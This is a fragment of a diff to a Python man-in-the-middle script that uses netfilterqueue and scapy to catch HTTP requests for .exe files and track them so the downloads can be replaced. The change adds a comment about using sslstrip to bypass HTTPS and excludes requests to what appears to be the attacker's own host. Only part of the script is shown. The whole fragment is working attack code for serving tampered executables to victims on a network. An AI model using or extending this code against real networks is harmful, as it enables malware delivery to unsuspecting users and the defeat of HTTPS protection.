@@ -9,6 +9,8 @@
 # Enable IP forwarding
 # $ echo 1 > /proc/sys/net/ipv4/ip_forward
 
+# run sslstrip to bypass HTTPS (change port to 10000 if you want to use sllstrip)
+
 import netfilterqueue
 import scapy.all as scapy
 
@@ -25,7 +27,7 @@ def processPacket(packet):
 	scapyPacket = scapy.IP(packet.get_payload())
 	if scapyPacket.haslayer(scapy.Raw):
 		if scapyPacket[scapy.TCP].dport == 80:
-			if ".exe" in scapyPacket[scapy.Raw].load:
+			if ".exe" in scapyPacket[scapy.Raw].load and "10.0.2.15" not in scapyPacket[scapy.Raw].load:
 				print("[+] EXE Request")
 				ackList.append(scapyPacket[scapy.TCP].ack)
 		elif scapyPacket[scapy.TCP].sport == 80:
